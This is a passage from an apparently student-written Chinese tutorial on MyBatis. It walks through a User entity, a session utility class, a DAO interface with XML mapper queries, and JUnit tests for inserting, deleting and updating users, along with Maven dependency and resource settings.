class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu.pojo;</span><br><span class="line"><span class="comment">/*用户实体*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String pwd;</span><br><span class="line">    <span class="comment">/*快捷键alt+insert</span></span><br><span class="line"><span class="comment">    属性私有 get()\set()\toString\有参构造、无参构造*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPwd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> pwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPwd</span><span class="params">(String pwd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.pwd = pwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, pwd=&#x27;&quot;</span> + pwd + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(Integer id, String name, String pwd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.pwd = pwd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="mybatis工具类编写"><a href="#mybatis工具类编写" class="headerlink" title="mybatis工具类编写"></a>mybatis工具类编写</h2><p>创建utils组件软件包，其中创建MybatisUtils的java类，创建sqlSessionFactory，建立数据库的连接。</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.io.Resources;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBatisUtils</span> &#123;</span><br><span class="line">    <span class="comment">/*InputStream inputStream;*/</span></span><br><span class="line">    <span class="comment">/*提升作用域*/</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SqlSessionFactory sqlSessionFactory;</span><br><span class="line"><span class="comment">/*代码块*/</span></span><br><span class="line">    <span class="keyword">static</span> &#123;<span class="comment">/*静态码块*/</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="string">&quot;mybatis-config.xml&quot;</span>;<span class="comment">/*定义resource对象属性*/</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(resource);</span><br><span class="line">            sqlSessionFactory=<span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(inputStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*sqlSessionFactory存在，就可以获得sqlSession实例（获得sqlSessio连接）</span></span><br><span class="line"><span class="comment">    * return sqlSession包含了大量增删改查方法，mybatis封装好的方法*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SqlSession <span class="title function_">getSqlSession</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">/*SqlSession sqlSession = sqlSessionFactory.openSession();</span></span><br><span class="line"><span class="comment">        return sqlSession;*/</span></span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactory.openSession();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setSqlSessionFactory</span><span class="params">(SqlSessionFactory sqlSessionFactory)</span> &#123;</span><br><span class="line">        MyBatisUtils.sqlSessionFactory = sqlSessionFactory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="接口定义接口映射文件"><a href="#接口定义接口映射文件" class="headerlink" title="接口定义接口映射文件"></a>接口定义接口映射文件</h2><p>定义命名空间所需要的数据访问层接口，这里设定的是程序使用的UserDao接口，包括程序使用的一些函数的定义，包括用户的查询，插入新用户，修改用户等方法的定义，接着就是创建接口映射文件UserDao.xml。</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.neuedu.pojo.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询所有用户</span></span><br><span class="line">List&lt;User&gt; <span class="title function_">getUserList</span><span class="params">()</span>;</span><br><span class="line">User <span class="title function_">getUserById</span><span class="params">(Integer id)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*插入一个用户*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">addUser</span><span class="params">(User user)</span>;</span><br><span class="line"><span class="comment">/*删除一个用户 根据ID*/</span></span><br><span class="line"><span class="type">int</span>  <span class="title function_">deleteUser</span><span class="params">(Integer id)</span>;</span><br><span class="line"><span class="comment">/*修改一个用户*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">updateUser</span><span class="params">(User user)</span>;</span><br><span class="line"><span class="comment">/*根据名字删除用户*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">deleteUserByName</span><span class="params">(String name)</span>;</span><br><span class="line"><span class="comment">/*根据姓名模糊查询*/</span></span><br><span class="line">List&lt;User&gt; <span class="title function_">getUserLike</span><span class="params">(String name)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>创建的UserDao.xml文件的具体代码如下：</p><p>用于具体方法的定义，即数据库的sql语句的具体使用：</p><ul><li><p>绑定的是namespace命名空间的数据访问层的接口位置；</p></li><li><p>数据库sql语句的使用的接口文件中的方法，以及返回的结果类型（实体类型），需要时也可以返回该字段的返回类型。</p></li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE mapper</span><br><span class="line">        PUBLIC <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="line">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="line">&lt;mapper namespace=<span class="string">&quot;com.neuedu.dao.UserDao&quot;</span>&gt;&lt;!--namespace 需要绑定数据访问层的接口--&gt;</span><br><span class="line">    &lt;!--&lt;select id=<span class="string">&quot;selectBlog&quot;</span> resultType=<span class="string">&quot;Blog&quot;</span>&gt;</span><br><span class="line">        select * from Blog <span class="type">where</span> <span class="variable">id</span> <span class="operator">=</span> #&#123;id&#125;   写自己的查询语句</span><br><span class="line">    &lt;/select&gt;--&gt;</span><br><span class="line">    &lt;select id=<span class="string">&quot;getUserList&quot;</span> resultType=<span class="string">&quot;com.neuedu.pojo.User&quot;</span> &gt;</span><br><span class="line">        select * from user</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">    &lt;select id=<span class="string">&quot;getUserById&quot;</span> resultType=<span class="string">&quot;com.neuedu.pojo.User&quot;</span> parameterType=<span class="string">&quot;int&quot;</span>&gt;</span><br><span class="line">            select * from user where id=#&#123;id&#125;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">&lt;/mapper&gt;</span><br></pre></td></tr></table></figure></div><h2 id="mybatis实现数据查询"><a href="#mybatis实现数据查询" class="headerlink" title="mybatis实现数据查询"></a>mybatis实现数据查询</h2><p>test软件包下的java文件中创建一个test文件用于实现数据的查询：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.neuedu.dao.UserDao;</span><br><span class="line"><span class="keyword">import</span> com.neuedu.pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.neuedu.utils.MyBatisUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTest</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span>  <span class="comment">/*单元测试的注解*/</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUserList</span><span class="params">()</span>&#123;<span class="comment">/*方法加&#123;&#125;*/</span></span><br><span class="line">        <span class="comment">/*1.获取sqlsession对象*/</span></span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="comment">/*2.获取mapper*/</span></span><br><span class="line">        <span class="type">UserDao</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserDao.class);</span><br><span class="line">        List&lt;User&gt; userList=mapper.getUserList();</span><br><span class="line">        System.out.println(userList);</span><br><span class="line">        <span class="comment">/*3.关闭资源*/</span></span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUserById</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">UserDao</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserDao.class);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> mapper.getUserById(<span class="number">1</span>);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        <span class="comment">/*关闭资源*/</span></span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>其中需要更新配置依赖，junit构建单元测试的注解，配置如下：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.jupiter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-jupiter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>当然，如果在此情况下，仍然出现无法连接并查到数据的情况，则需要加上一个maven的过滤装置：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--Maven静态资源过滤问题--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="作业完成"><a href="#作业完成" class="headerlink" title="作业完成"></a>作业完成</h2><p><a class="link"   href="https://www.notion.so/1212-112104560805-3-12-6025c4cfe25f4b28bf5d19cf5ab0c089?pvs=21" >软件1212-姜芙蓉-112104560805-作业完成3.12 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>1.插入一个新用户：在UserDao接口类中定义插入用户的函数方法，接着在UserDao.xml文件中写出mybatis的sql语句，记住标签要随着sql语句的内容进行更改，代码如下：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///UserDao.java</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*插入一个用户*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">addUser</span><span class="params">(User user)</span>;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--UserDao.xml--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;addUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.neuedu.pojo.User&quot;</span> &gt;</span></span><br><span class="line">        insert into user(id,name,pwd) values(#&#123;id&#125;,#&#123;name&#125;,#&#123;pwd&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*MyTest.java*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*插入一个用户*/</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addUser</span><span class="params">()</span>&#123;</span><br><span class="line">        SqlSession sqlSession=MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">UserDao</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserDao.class);</span><br><span class="line">        <span class="type">int</span> flag=mapper.addUser(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">24</span>,<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;852963&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span>(flag&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;insert success&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sqlSession.commit();</span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//另一种写法</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addUser</span><span class="params">()</span>&#123;</span><br><span class="line">        SqlSession sqlSession=MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">UserDao</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserDao.class);</span><br><span class="line">        <span class="type">int</span> adduser=mapper.addUser(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">23</span>,<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;852963&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        System.out.println(adduser);</span><br><span class="line">        System.out.println(<span class="string">&quot;insert success&quot;</span>);</span><br><span class="line"></span><br><span class="line">        sqlSession.commit();</span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>![Untitled](.&#x2F;SSM.assets&#x2F;Untitled 1.png)</p><p>2.删除一个用户 根据ID：在UserDao接口类中定义插入用户的函数方法，接着在UserDao.xml文件中写出mybatis的sql语句，记住标签要随着sql语句的内容进行更改，注意sql语句的书写，代码如下：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///UserDao.java</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*删除一个用户 根据ID*/</span></span><br><span class="line"><span class="type">int</span>  <span class="title function_">deleteUser</span><span class="params">(Integer id)</span>;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--UserDao.xml--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--/*删除一个用户 根据ID*/--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.neuedu.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        delete  from user where id=#&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*MyTest.java*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*删除一个用户 根据ID*/</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteUser</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">UserDao</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserDao.class);</span><br><span class="line">        <span class="type">int</span> <span class="variable">flag</span> <span class="operator">=</span> mapper.deleteUser(<span class="number">23</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;delete success&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*关闭资源*/</span></span><br><span class="line">        sqlSession.commit();</span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>![Untitled](.&#x2F;SSM.assets&#x2F;Untitled 2.png)</p><p>3.修改一个用户：在UserDao接口类中定义插入用户的函数方法，接着在UserDao.xml文件中写出mybatis的sql语句，记住标签要随着sql语句的内容进行更改，注意sql语句的书写，代码如下：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///UserDao.java</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*修改一个用户*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">updateUser</span><span class="params">(User user)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--UserDao.xml--&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">&lt;!--/*修改一个用户*/--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;updateUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.neuedu.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        update user set name=#&#123;name&#125;,pwd=#&#123;pwd&#125; where id=#&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 